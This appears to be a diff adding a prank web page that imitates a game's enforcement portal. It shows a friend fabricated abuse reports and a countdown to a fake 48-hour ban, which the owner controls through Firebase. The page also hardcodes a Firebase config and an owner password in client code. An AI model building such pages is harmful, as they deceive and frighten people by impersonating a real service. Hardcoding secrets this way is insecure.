+    <ul style="font-size:12.5px;color:var(--text-dim);line-height:1.7;padding-left:18px;margin-bottom:18px;">
+      <li>Use of unauthorized third-party software</li>
+      <li>Modification of game files or memory</li>
+      <li>Teammate abuse or intentional team sabotage</li>
+      <li>Rank manipulation and match fixing</li>
+      <li>Offensive language or harassment</li>
+      <li>Account sharing or account trading</li>
+    </ul>
+    <p style="font-size:12.5px;">
+      Confirmed violations result in warnings, temporary restrictions, or
+      permanent bans depending on severity and report history.
+    </p>
+    <button class="btn btn-default btn-block" data-close="policyModal" style="margin-top:18px;">Close</button>
+  </div>
+</div>
+
+<div class="modal" id="ownerLoginModal">
+  <div class="modal-card">
+    <h2>Administrator Access</h2>
+    <p>This area is restricted to portal administrators.</p>
+    <div class="field">
+      <label class="field-label" for="ownerPassInput">Access Password</label>
+      <input type="password" id="ownerPassInput" class="input" placeholder="Enter password" autocomplete="off" />
+    </div>
+    <button class="btn btn-primary btn-block" id="ownerLoginBtn">Unlock</button>
+    <button class="btn btn-default btn-block" data-close="ownerLoginModal">Cancel</button>
+    <div class="modal-status" id="ownerLoginStatus"></div>
+  </div>
+</div>
+
+<div class="modal" id="ownerDashModal">
+  <div class="modal-card owner-card">
+    <div class="owner-pill">● Authenticated as Owner</div>
+    <h2>Timer Control Panel</h2>
+    <p>Start or reset the 48-hour restriction timer. This syncs live to every device via Firebase.</p>
+
+    <div class="owner-info">
+      <div class="owner-row">
+        <span class="k">Current Status</span>
+        <span class="v idle" id="dashStatus">Idle</span>
+      </div>
+      <div class="owner-row">
+        <span class="k">Time Remaining</span>
+        <span class="v" id="dashRemain">—</span>
+      </div>
+      <div class="owner-row">
+        <span class="k">End Time</span>
+        <span class="v" id="dashEnd">—</span>
+      </div>
+      <div class="owner-row">
+        <span class="k">Current Phase</span>
+        <span class="v" id="dashPhase">—</span>
+      </div>
+    </div>
+
+    <button class="btn btn-primary btn-block" id="btnStartTimer">▶ Start 48-Hour Timer</button>
+    <button class="btn btn-danger btn-block" id="btnResetTimer">⟲ Reset Timer</button>
+    <button class="btn btn-default btn-block" data-close="ownerDashModal">Close</button>
+
+    <div class="modal-status" id="dashStatusMsg"></div>
+  </div>
+</div>
+
+<!-- ═══════════════ FIREBASE ═══════════════ -->
+<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
+
+<script>
+/* ══════════════════════════════════════════════════════════════
+   FIREBASE
+   ══════════════════════════════════════════════════════════════ */
+const firebaseConfig = {
+  apiKey: "AIzaSyCInBv3nuNYblL_Yw7-rM2g-nlQ-9_EBW4",
+  authDomain: "sync-app-7a7b8.firebaseapp.com",
+  databaseURL: "https://sync-app-7a7b8-default-rtdb.firebaseio.com",
+  projectId: "sync-app-7a7b8",
+  storageBucket: "sync-app-7a7b8.firebasestorage.app",
+  messagingSenderId: "654073080180",
+  appId: "1:654073080180:web:67b010bf64541b4b4b6421"
+};
+
+firebase.initializeApp(firebaseConfig);
+const db = firebase.database();
+const timerRef = db.ref("banTimer");
+
+/* ══════════════════════════════════════════════════════════════
+   CONSTANTS
+   ══════════════════════════════════════════════════════════════ */
+const OWNER_PASSWORD = "LPGPDRDS";
+const BAN_DURATION   = 48 * 60 * 60 * 1000;
+const LS_UID_KEY     = "ff_prank_uid";
+const LS_VERIFY_KEY  = "ff_prank_verified";
+const SS_OWNER_KEY   = "ff_owner_session";
+
+const PHASES = {
+  review: {
+    label: "Under Review",
+    badge: "amber",
+    etaLabel: "Review ETA",
+    desc: "Your case has been assigned to the enforcement team and is currently under review. Additional evidence may be attached during this phase."
+  },
+  evidence: {
+    label: "Evidence Compiling",
+    badge: "amber",
+    etaLabel: "Decision ETA",
+    desc: "The automated review system is compiling additional evidence from your recent matches. Manual review is pending."
+  },
+  pending: {
+    label: "Decision Pending",
+    badge: "blue",
+    etaLabel: "Decision ETA",
+    desc: "Evidence review is complete. A final decision on your case is pending sign-off by the enforcement team."
+  },
+  enforcement: {
+    label: "Enforcement Scheduled",
+    badge: "red",
+    etaLabel: "Enforcement In",
+    desc: "Enforcement action has been scheduled for this account. The restriction will take effect at the scheduled time."
+  },
+  banned: {
+    label: "Banned",
+    badge: "red",
+    etaLabel: "Status",
+    desc: "This account has been permanently restricted following review of multiple confirmed reports."
+  }
+};
+
+const REPORT_CATEGORIES = [
+  "Teammate Abuse",
+  "Third-Party Software",
+  "Voice Chat Violation",
+  "Rank Manipulation",
+  "Account Sharing",
+  "Exploiting Bug",
+  "Cheating Software",
+  "Offensive Language",
+  "AFK / Team Sabotage",
+  "Account Trading"
+];
+
+const REVIEWERS = [
+  "Enforcement Team",
+  "Anti-Cheat Team",
+  "Moderation Team",
+  "Region IN Team",
+  "Automated Enforcement v4.2"
+];
+
+/* ══════════════════════════════════════════════════════════════
+   STATE
+   ══════════════════════════════════════════════════════════════ */
+const state = {
+  uid: "",
+  verify: "",
+  caseId: "",
+  reports: [],
+  endTime: 0,
+  currentStep: "stepUid",
+  lastSyncTime: Date.now(),
+  lastPhaseKey: "",
+  revealTriggered: false,
+  tickInterval: null,
+  syncInterval: null,
+  ownerSession: false
+};
+
+/* ══════════════════════════════════════════════════════════════
+   HELPERS
+   ══════════════════════════════════════════════════════════════ */
+const $ = (id) => document.getElementById(id);
+const pad = (n) => String(n).padStart(2, "0");
+
+function showStep(id) {
+  document.querySelectorAll(".step-screen").forEach((s) => s.classList.add("hidden"));
+  const el = $(id);
+  if (el) el.classList.remove("hidden");
+  state.currentStep = id;
+  window.scrollTo({ top: 0, behavior: "instant" });
+
+  const mapping = {
+    stepUid:    ["progUid", "progVerify", "progCase"],
+    stepVerify: ["progUid", "progVerify", "progCase"],
+    stepCase:   ["progUid", "progVerify", "progCase"]
+  };
+  const [p1, p2, p3] = mapping[id];
+  [p1, p2, p3].forEach((pid) => {
+    const el = $(pid);
+    if (el) el.classList.remove("active", "done");
+  });
+
+  if (id === "stepUid") {
+    $(p1).classList.add("active");
+  } else if (id === "stepVerify") {
+    $(p1).classList.add("done");
+    $(p2).classList.add("active");
+  } else if (id === "stepCase") {
+    $(p1).classList.add("done");
+    $(p2).classList.add("done");
+    $(p3).classList.add("active");
+  }
+}
+
+function mulberry32(seed) {
+  return function () {
+    seed |= 0;
+    seed = (seed + 0x6D2B79F5) | 0;
+    let t = Math.imul(seed ^ (seed >>> 15), 1 | seed);
+    t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
+    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
+  };
+}
+
+function formatDate(date) {
+  const months = ["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"];
+  return (
+    date.getDate() + " " +
+    months[date.getMonth()] + " " +
+    date.getFullYear() + ", " +
+    pad(date.getHours()) + ":" +
+    pad(date.getMinutes())
+  );
+}
+
+function formatRemain(ms) {
+  if (ms <= 0) return "00:00:00";
+  const total = Math.floor(ms / 1000);
+  const h = Math.floor(total / 3600);
+  const m = Math.floor((total % 3600) / 60);
+  const s = total % 60;
+  return pad(h) + ":" + pad(m) + ":" + pad(s);
+}
+
+/* ══════════════════════════════════════════════════════════════
+   SAFE STORAGE WRAPPERS
+   ══════════════════════════════════════════════════════════════ */
+function safeGet(store, key) {
+  try { return store.getItem(key); } catch (e) { return null; }
+}
+function safeSet(store, key, val) {
+  try { store.setItem(key, val); return true; } catch (e) { return false; }
+}
+function safeRemove(store, key) {
+  try { store.removeItem(key); } catch (e) {}
+}
+
+/* ══════════════════════════════════════════════════════════════
+   REPORT / CASE GENERATORS
+   ══════════════════════════════════════════════════════════════ */
+function generateReports(uid) {
+  const seed = parseInt(uid.slice(-6), 10) || 123456;
+  const rng = mulberry32(seed);
+  const count = 8 + Math.floor(rng() * 7);
+  const reports = [];
+  const now = Date.now();
+
+  for (let i = 0; i < count; i++) {
+    const daysAgo = 1 + Math.floor(rng() * 6);
+    const hoursAgo = Math.floor(rng() * 24);
+    const date = new Date(now - daysAgo * 86400000 - hoursAgo * 3600000);
+    reports.push({
+      id: "RPT-" + Math.floor(100000 + rng() * 899999),
+      date: date,
+      matchId: String(Math.floor(10000000 + rng() * 89999999)),
+      category: REPORT_CATEGORIES[Math.floor(rng() * REPORT_CATEGORIES.length)],
+      reviewer: REVIEWERS[Math.floor(rng() * REVIEWERS.length)]
+    });
+  }
+
+  return reports.sort((a, b) => b.date - a.date);
+}
+
+function generateCaseId(uid) {
+  const seed = parseInt(uid.slice(-4), 10) || 1000;
+  const year = new Date().getFullYear();
+  const num = 100000 + (seed * 37 % 899999);
+  return "CASE-FF-IN-" + year + "-" + num;
+}
+
+function getPhaseKey(endTime) {
+  if (!endTime) return "none";
+  const ms = endTime - Date.now();
+  if (ms <= 0) return "banned";
+  const hrs = ms / 3600000;
+  if (hrs > 36) return "review";
+  if (hrs > 24) return "evidence";
+  if (hrs > 12) return "pending";
+  return "enforcement";
+}
+
+/* ══════════════════════════════════════════════════════════════
+   RENDER
+   ══════════════════════════════════════════════════════════════ */
+function renderCaseFile() {
+  $("caseIdDisplay").textContent = state.caseId;
+  $("metaUid").textContent = state.uid;
+  $("metaSubmitted").textContent = formatDate(new Date(Date.now() - 86400000 * 2 - 3600000 * 5));
+
+  $("evidenceCount").textContent = state.reports.length + " reports";
+  const list = $("evidenceList");
+  list.innerHTML = "";
+  state.reports.forEach((r) => {
+    const row = document.createElement("div");
+    row.className = "report-row";
+    row.innerHTML =
+      '<div class="report-main">' +
+        '<div class="report-id">' + r.id + '</div>' +
+        '<div class="report-meta">' +
+          '<span>' + formatDate(r.date) + '</span>' +
+          '<span class="dot">·</span>' +
+          '<span>Match ' + r.matchId + '</span>' +
+          '<span class="dot">·</span>' +
+          '<span>' + r.reviewer + '</span>' +
+        '</div>' +
+      '</div>' +
+      '<span class="report-cat">' + r.category + '</span>';
+    list.appendChild(row);
+  });
+
+  renderPhase();
+  renderEta();
+}
+
+function renderPhase() {
+  const phaseKey = getPhaseKey(state.endTime);
+
+  if (phaseKey === "none") {
+    $("caseStatusPill").className = "status-pill amber";
+    $("caseStatusPill").textContent = "Pending Review";
+    $("phaseDesc").textContent = "This case is queued for review. No active restriction is scheduled at this time.";
+    $("etaLabel").textContent = "Review ETA";
+    $("etaHeaderLabel").textContent = "Review ETA";
+    $("bannedNotice").classList.add("hidden");
+    $("caseTitle").textContent = "Incident Report";
+    $("appealLink").textContent = "Submit Appeal";
+    state.lastPhaseKey = "none";
+    return;
+  }
+
+  const phase = PHASES[phaseKey];
+  $("caseStatusPill").className = "status-pill " + phase.badge;
+  $("caseStatusPill").textContent = phase.label;
+  $("phaseDesc").textContent = phase.desc;
+  $("etaLabel").textContent = phase.etaLabel;
+  $("etaHeaderLabel").textContent = phase.etaLabel;
+
+  if (phaseKey === "banned") {
+    $("bannedNotice").classList.remove("hidden");
+    $("caseTitle").textContent = "Enforcement Decision";
+    $("appealLink").textContent = "Appeal (Closed)";
+  } else {
+    $("bannedNotice").classList.add("hidden");
+    $("caseTitle").textContent = "Incident Report";
+    $("appealLink").textContent = "Submit Appeal";
+  }
+
+  state.lastPhaseKey = phaseKey;
+}
+
+function renderEta() {
+  const el = $("etaValue");
+
+  if (!state.endTime) {
+    el.classList.add("waiting");
+    el.textContent = "Pending — no active restriction";
+    return;
+  }
+
+  const ms = state.endTime - Date.now();
+
+  if (ms <= 0) {
+    el.classList.remove("waiting");
+    el.textContent = "00:00:00";
+    if (!state.revealTriggered) {
+      state.revealTriggered = true;
+      renderPhase();
+    }
+    return;
+  }
+
+  el.classList.remove("waiting");
+  const total = Math.floor(ms / 1000);
+  const h = Math.floor(total / 3600);
+  const m = Math.floor((total % 3600) / 60);
+  const s = total % 60;
+
+  el.innerHTML =
+    '<span>' + pad(h) + '</span>' +
+    '<span class="colon">:</span>' +
+    '<span>' + pad(m) + '</span>' +
+    '<span class="colon">:</span>' +
+    '<span>' + pad(s) + '</span>';
+}
+
+function updateSyncLabel() {
+  const el = $("lastSynced");
+  if (!el) return;
+  const diff = Math.floor((Date.now() - state.lastSyncTime) / 1000);
+  if (diff < 5) el.textContent = "Last synced just now";
+  else if (diff < 60) el.textContent = "Last synced " + diff + "s ago";
+  else el.textContent = "Last synced " + Math.floor(diff / 60) + "m ago";
+}
+
+/* ══════════════════════════════════════════════════════════════
+   STEP 1: UID ENTRY
+   ══════════════════════════════════════════════════════════════ */
+$("uidInput").addEventListener("input", (e) => {
+  e.target.value = e.target.value.replace(/\D/g, "").slice(0, 12);
+});
+
+$("btnToVerify").addEventListener("click", () => {
+  const input = $("uidInput");
+  const uid = input.value.trim();
+
+  if (uid.length < 5) {
+    input.classList.add("error");
+    setTimeout(() => input.classList.remove("error"), 800);
+    if (navigator.vibrate) navigator.vibrate([40, 50, 40]);
+    return;
+  }
+
+  state.uid = uid;
+  $("verifyUidDisplay").textContent = uid;
+  showStep("stepVerify");
+});
+
+$("uidInput").addEventListener("keydown", (e) => {
+  if (e.key === "Enter") $("btnToVerify").click();
+});
+
+/* ══════════════════════════════════════════════════════════════
+   STEP 2: VERIFY
+   ══════════════════════════════════════════════════════════════ */
+$("verifyInput").addEventListener("input", (e) => {
+  e.target.value = e.target.value.replace(/\D/g, "").slice(0, 4);
+});
+
+$("btnVerify").addEventListener("click", () => {
+  const input = $("verifyInput");
+  const v = input.value.trim();
+
+  if (v.length < 3) {
+    input.classList.add("error");
+    setTimeout(() => input.classList.remove("error"), 800);
+    if (navigator.vibrate) navigator.vibrate([40, 50, 40]);
+    return;
+  }
+
+  state.verify = v;
+
+  // Save to localStorage so refresh skips straight to case file
+  safeSet(localStorage, LS_UID_KEY, state.uid);
+  safeSet(localStorage, LS_VERIFY_KEY, "1");
+
+  state.caseId = generateCaseId(state.uid);
+  state.reports = generateReports(state.uid);
+  state.revealTriggered = false;
+  state.lastPhaseKey = "";
+
+  showStep("stepCase");
+  $("caseTitle").textContent = "Loading Case File…";
+  $("caseIdDisplay").textContent = state.caseId;
+  $("metaUid").textContent = state.uid;
+  $("evidenceList").innerHTML = '<div class="processing"><div class="spinner"></div><div class="processing-title">Retrieving case records</div><div class="processing-desc">Please wait while we fetch your case file…</div></div>';
+
+  setTimeout(() => {
+    renderCaseFile();
+    startLiveUpdates();
+  }, 1200);
+});
+
+$("verifyInput").addEventListener("keydown", (e) => {
+  if (e.key === "Enter") $("btnVerify").click();
+});
+
+/* ══════════════════════════════════════════════════════════════
+   RESTORE SESSION (called on load)
+   ══════════════════════════════════════════════════════════════ */
+function restoreSession() {
+  // 1. Owner session?
+  if (safeGet(sessionStorage, SS_OWNER_KEY) === "1") {
+    state.ownerSession = true;
+    updateSigninButtonLabel();
+  }
+
+  // 2. UID verified? Restore case file directly
+  const savedUid = safeGet(localStorage, LS_UID_KEY);
+  const savedVerified = safeGet(localStorage, LS_VERIFY_KEY);
+
+  if (savedUid && savedVerified === "1") {
+    state.uid = savedUid;
+    state.caseId = generateCaseId(state.uid);
+    state.reports = generateReports(state.uid);
+    state.revealTriggered = false;
+    state.lastPhaseKey = "";
+
+    showStep("stepCase");
+    $("caseTitle").textContent = "Loading Case File…";
+    $("caseIdDisplay").textContent = state.caseId;
+    $("metaUid").textContent = state.uid;
+    $("evidenceList").innerHTML = '<div class="processing"><div class="spinner"></div><div class="processing-title">Retrieving case records</div><div class="processing-desc">Please wait while we fetch your case file…</div></div>';
+
+    setTimeout(() => {
+      renderCaseFile();
+      startLiveUpdates();
+    }, 900);
+
+    return;
+  }
+
+  // 3. Fresh visitor
+  showStep("stepUid");
+}
+
+/* ══════════════════════════════════════════════════════════════
+   LIVE UPDATES
+   ══════════════════════════════════════════════════════════════ */
+function startLiveUpdates() {
+  timerRef.on("value", (snap) => {
+    const data = snap.val();
+    state.endTime = data && data.endTime ? Number(data.endTime) : 0;
+    state.lastSyncTime = Date.now();
+    updateSyncLabel();
+
+    if (state.currentStep === "stepCase") {
+      renderPhase();
+      renderEta();
+    }
+  });
+
+  if (state.tickInterval) clearInterval(state.tickInterval);
+  state.tickInterval = setInterval(() => {
+    if (state.currentStep === "stepCase") {
+      const prevPhase = state.lastPhaseKey;
+      const newPhase = getPhaseKey(state.endTime);
+      if (prevPhase !== newPhase) renderPhase();
+      renderEta();
+    }
+  }, 1000);
+
+  if (state.syncInterval) clearInterval(state.syncInterval);
+  state.syncInterval = setInterval(updateSyncLabel, 2000);
+}
+
+/* ══════════════════════════════════════════════════════════════
+   APPEAL / POLICY
+   ══════════════════════════════════════════════════════════════ */
+$("appealLink").addEventListener("click", (e) => {
+  e.preventDefault();
+  const phaseKey = getPhaseKey(state.endTime);
+
+  if (phaseKey === "banned" || phaseKey === "enforcement") {
+    $("appealTitle").textContent = "Appeal Window Closed";
+    $("appealBody").textContent = "The appeal window for this case has closed. Enforcement decisions are final after the review period has ended.";
+  } else if (phaseKey === "pending") {
+    $("appealTitle").textContent = "Appeal Not Available";
+    $("appealBody").textContent = "A final decision on your case is pending. Appeals can only be submitted after the decision is issued.";
+  } else if (phaseKey === "none") {
+    $("appealTitle").textContent = "No Active Enforcement";
+    $("appealBody").textContent = "There is no enforcement action currently scheduled for this account. No appeal is required at this time.";
+  } else {
+    $("appealTitle").textContent = "Appeal Already Under Review";
+    $("appealBody").textContent = "An appeal for this case is already part of the ongoing review. You will be notified of the outcome once a decision is made.";
+  }
+
+  openModal("appealModal");
+});
+
+$("policyLink").addEventListener("click", (e) => {
+  e.preventDefault();
+  openModal("policyModal");
+});
+
+/* ══════════════════════════════════════════════════════════════
+   MODALS
+   ══════════════════════════════════════════════════════════════ */
+function openModal(id) { $(id).classList.add("active"); }
+function closeModal(id) { $(id).classList.remove("active"); }
+
+document.querySelectorAll("[data-close]").forEach((el) => {
+  el.addEventListener("click", () => closeModal(el.dataset.close));
+});
+
+document.querySelectorAll(".modal").forEach((m) => {
+  m.addEventListener("click", (e) => {
+    if (e.target === m) closeModal(m.id);
+  });
+});
+
+/* ══════════════════════════════════════════════════════════════
+   SIGN IN BUTTON (owner access)
+   ══════════════════════════════════════════════════════════════ */
+$("signinBtn").addEventListener("click", () => {
+  if (state.ownerSession) {
+    openOwnerDash();
+  } else {
+    openModal("ownerLoginModal");
+    $("ownerPassInput").value = "";
+    $("ownerLoginStatus").textContent = "";
+    $("ownerLoginStatus").className = "modal-status";
+    setTimeout(() => $("ownerPassInput").focus(), 100);
+  }
+});
+
+function updateSigninButtonLabel() {
+  const btn = $("signinBtn");
+  if (state.ownerSession) {
+    btn.textContent = "Owner Panel";
+    btn.classList.add("owner-active");
+  } else {
+    btn.textContent = "Sign In";
+    btn.classList.remove("owner-active");
+  }
+}
+
+/* ══════════════════════════════════════════════════════════════
+   FOOTER 5-TAP (backup owner access)
+   ══════════════════════════════════════════════════════════════ */
+let footerTaps = 0;
+let lastFooterTap = 0;
+
+$("footerCopyright").addEventListener("click", () => {
+  const now = Date.now();
+  footerTaps = (now - lastFooterTap < 900) ? footerTaps + 1 : 1;
+  lastFooterTap = now;
+
+  if (footerTaps >= 5) {
+    footerTaps = 0;
+    if (state.ownerSession) {
+      openOwnerDash();
+    } else {
+      openModal("ownerLoginModal");
+      $("ownerPassInput").value = "";
+      $("ownerLoginStatus").textContent = "";
+      $("ownerLoginStatus").className = "modal-status";
+      setTimeout(() => $("ownerPassInput").focus(), 100);
+    }
+  }
+});
+
+/* ══════════════════════════════════════════════════════════════
+   OWNER LOGIN
+   ══════════════════════════════════════════════════════════════ */
+$("ownerLoginBtn").addEventListener("click", () => {
+  const pass = $("ownerPassInput").value;
+  const st = $("ownerLoginStatus");
+
+  if (pass === OWNER_PASSWORD) {
+    state.ownerSession = true;
+    safeSet(sessionStorage, SS_OWNER_KEY, "1");
+    updateSigninButtonLabel();
+    st.textContent = "Access granted";
+    st.className = "modal-status ok";
+    setTimeout(() => {
+      closeModal("ownerLoginModal");
+      openOwnerDash();
+    }, 500);
+  } else {
+    st.textContent = "Invalid password";
+    st.className = "modal-status err";
+    $("ownerPassInput").value = "";
+    if (navigator.vibrate) navigator.vibrate(100);
+  }
+});
+
+$("ownerPassInput").addEventListener("keydown", (e) => {
+  if (e.key === "Enter") $("ownerLoginBtn").click();
+});
+
+/* ══════════════════════════════════════════════════════════════
+   OWNER DASHBOARD
+   ══════════════════════════════════════════════════════════════ */
+function openOwnerDash() {
+  openModal("ownerDashModal");
+  updateOwnerDash();
+}
+
+function updateOwnerDash() {
+  const statusEl = $("dashStatus");
+  const remainEl = $("dashRemain");
+  const endEl = $("dashEnd");
+  const phaseEl = $("dashPhase");
+
+  if (!state.endTime) {
+    statusEl.textContent = "Idle";
+    statusEl.className = "v idle";
+    remainEl.textContent = "—";
+    endEl.textContent = "—";
+    phaseEl.textContent = "—";
+    return;
+  }
+
+  const now = Date.now();
+  const ms = state.endTime - now;
+
+  endEl.textContent = new Date(state.endTime).toLocaleString();
+
+  if (ms <= 0) {
+    statusEl.textContent = "Expired";
+    statusEl.className = "v expired";
+    remainEl.textContent = "00:00:00";
+    phaseEl.textContent = "Banned";
+    return;
+  }
+
+  statusEl.textContent = "Running";
+  statusEl.className = "v ok";
+  remainEl.textContent = formatRemain(ms);
+
+  const phaseKey = getPhaseKey(state.endTime);
+  phaseEl.textContent = PHASES[phaseKey] ? PHASES[phaseKey].label : "—";
+}
+
+setInterval(() => {
+  if ($("ownerDashModal").classList.contains("active") && state.ownerSession) {
+    updateOwnerDash();
+  }
+}, 1000);
+
+$("btnStartTimer").addEventListener("click", () => {
+  const st = $("dashStatusMsg");
+  const newEnd = Date.now() + BAN_DURATION;
+
+  timerRef
+    .set({ endTime: newEnd })
+    .then(() => {
+      state.endTime = newEnd;
+      state.revealTriggered = false;
+      st.textContent = "48-hour timer started.";
+      st.className = "modal-status ok";
+      updateOwnerDash();
+    })
+    .catch(() => {
+      st.textContent = "Database write failed.";
+      st.className = "modal-status err";
+    });
+});
+
+$("btnResetTimer").addEventListener("click", () => {
+  const st = $("dashStatusMsg");
+  timerRef
+    .set({ endTime: 0 })
+    .then(() => {
+      state.endTime = 0;
+      state.revealTriggered = false;
+      st.textContent = "Timer reset.";
+      st.className = "modal-status ok";
+      updateOwnerDash();
+    })
+    .catch(() => {
+      st.textContent = "Database write failed.";
+      st.className = "modal-status err";
+    });
+});
+
+/* ══════════════════════════════════════════════════════════════
+   BOOTSTRAP
+   ══════════════════════════════════════════════════════════════ */
+window.addEventListener("load", () => {
+  // Initial phase known from Firebase
+  timerRef.once("value", (snap) => {
+    const data = snap.val();
+    state.endTime = data && data.endTime ? Number(data.endTime) : 0;
+    state.lastSyncTime = Date.now();
+  });
+
+  // Live listener always active
+  timerRef.on("value", (snap) => {
+    const data = snap.val();
+    state.endTime = data && data.endTime ? Number(data.endTime) : 0;
+    state.lastSyncTime = Date.now();
+  });
+
+  // Restore previous session (owner + friend UID)
+  restoreSession();
+});
+</script>
+
+</body>
+</html>
